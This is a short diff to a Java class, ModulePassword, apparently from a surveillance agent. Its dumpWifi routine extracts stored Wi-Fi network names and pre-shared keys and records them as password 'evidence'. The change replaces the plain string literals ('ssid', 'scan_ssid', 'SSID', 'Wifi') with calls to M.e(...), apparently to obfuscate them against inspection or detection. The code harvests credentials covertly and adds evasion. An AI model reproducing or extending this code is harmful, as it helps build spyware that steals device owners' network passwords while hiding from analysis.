@@ -146,7 +146,7 @@ public class ModulePassword extends BaseModule {
 		String psk = "";
 		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 		for (String line : lines) {
-			if (line.contains("ssid") && !line.contains("scan_ssid")) {
+			if (line.contains(M.e("ssid")) && !line.contains(M.e("scan_ssid"))) {
 				ssid = getValue(line);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
@@ -156,7 +156,7 @@ public class ModulePassword extends BaseModule {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (dumpWifi) psk = %s", psk);
 				}
-				addToEvidence(evidence, ssid, "SSID", psk, "Wifi");
+				addToEvidence(evidence, ssid, M.e("SSID"), psk, M.e("Wifi"));
 			}
 		}
 		evidence.close();
